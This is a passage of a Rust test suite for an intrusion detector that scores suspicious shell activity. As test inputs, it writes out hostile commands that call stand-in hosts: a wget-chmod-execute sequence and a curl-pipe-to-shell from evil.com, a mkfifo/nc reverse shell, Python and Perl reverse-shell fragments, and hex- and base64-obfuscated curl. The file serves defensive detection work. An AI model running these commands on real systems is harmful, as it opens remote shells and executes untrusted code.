        assert_eq!(evidence["kind"], "suspicious_execution");
        assert_eq!(evidence["user"], "deploy");
    }

    #[test]
    fn detector_normal_sudo_not_flagged() {
        let mut det = make_detector();
        // Sudo by itself is 25 points → below threshold, no incident
        let ev = sudo_event("alice", "/usr/bin/systemctl status nginx", Utc::now());
        // sudo escalation alone = 25, which is below THRESHOLD_NONE (30)
        assert!(
            det.process(&ev).is_none(),
            "normal sudo should not trigger incident"
        );
    }

    // ------------------------------------------------------------------
    // Timeline correlation: download → chmod → execute sequence
    // ------------------------------------------------------------------

    #[test]
    fn timeline_detects_download_chmod_execute_sequence() {
        let mut det = make_detector();
        let base = Utc::now();

        // Step 1: download to /tmp
        det.process(&exec_event(
            &["wget", "-O", "/tmp/payload", "http://evil.com/payload"],
            base,
        ));

        // Step 2: chmod +x
        det.process(&exec_event(
            &["chmod", "+x", "/tmp/payload"],
            base + Duration::seconds(10),
        ));

        // Step 3: execute from /tmp (absolute path)
        // Score breakdown:
        //   TmpExecution (+30) + SequenceBonus (+25) = 55 → Low severity incident
        let inc = det.process(&exec_event(&["/tmp/payload"], base + Duration::seconds(20)));

        assert!(
            inc.is_some(),
            "download → chmod → /tmp execute sequence should produce an incident"
        );
        let inc = inc.unwrap();
        assert_eq!(inc.severity, Severity::Low);
        let signals = inc.evidence[0]["signals"].as_array().unwrap();
        let has_seq = signals
            .iter()
            .any(|s| s.as_str() == Some("download_chmod_execute_sequence"));
        assert!(has_seq, "sequence bonus signal should be present");
    }

    // ------------------------------------------------------------------
    // Inline script via bash -c
    // ------------------------------------------------------------------

    #[test]
    fn detector_analyzes_bash_c_inline_script() {
        let mut det = make_detector();
        let ev = exec_event(&["bash", "-c", "curl http://evil.com | sh"], Utc::now());
        let inc = det.process(&ev);
        assert!(
            inc.is_some(),
            "bash -c with curl|sh should produce an incident"
        );
        if let Some(i) = inc {
            let signals = i.evidence[0]["signals"].as_array().unwrap();
            let has_dle = signals
                .iter()
                .any(|s| s.as_str() == Some("download_and_execute"));
            assert!(has_dle, "should include download_and_execute signal");
        }
    }

    #[test]
    fn detects_python_reverse_shell() {
        let mut p = tree_sitter::Parser::new();
        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
        let signals = analyze_ast(
            &mut p,
            "python3 -c 'import socket,subprocess;s=socket.socket()'",
        );
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
            "should detect python reverse shell: {signals:?}"
        );
    }

    #[test]
    fn detects_hex_echo_obfuscation() {
        let mut p = tree_sitter::Parser::new();
        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
        let signals = analyze_ast(&mut p, "echo -e '\\x63\\x75\\x72\\x6c' | sh");
        assert!(
            signals
                .iter()
                .any(|s| s.kind == SignalKind::Obfuscated
                    || s.kind == SignalKind::DownloadAndExecute),
            "should detect hex echo obfuscation: {signals:?}"
        );
    }

    #[test]
    fn detects_eval_base64_decode() {
        let mut p = tree_sitter::Parser::new();
        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
        let signals = analyze_ast(
            &mut p,
            "eval $(echo 'Y3VybCBodHRwOi8vZXZpbC5jb20K' | base64 -d)",
        );
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::Obfuscated),
            "should detect eval+base64: {signals:?}"
        );
    }

    #[test]
    fn detects_perl_reverse_shell() {
        let mut p = tree_sitter::Parser::new();
        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
        let signals = analyze_ast(&mut p, "perl -e 'use socket;$i=\"1.2.3.4\";$p=4444;'");
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
            "should detect perl reverse shell: {signals:?}"
        );
    }

    #[test]
    fn detects_mkfifo_reverse_shell() {
        let mut p = tree_sitter::Parser::new();
        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
        let signals = analyze_ast(
            &mut p,
            "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f",
        );
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
            "should detect mkfifo reverse shell: {signals:?}"
        );
    }

    #[test]
    fn detects_bash_hex_escape() {
        let argv = vec![
            "$'\\x63\\x75\\x72\\x6c'".to_string(),
            "http://evil.com".to_string(),
        ];
        let signals = analyze_argv(&argv);
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::Obfuscated),
            "should detect bash hex escape: {signals:?}"
        );
    }
}
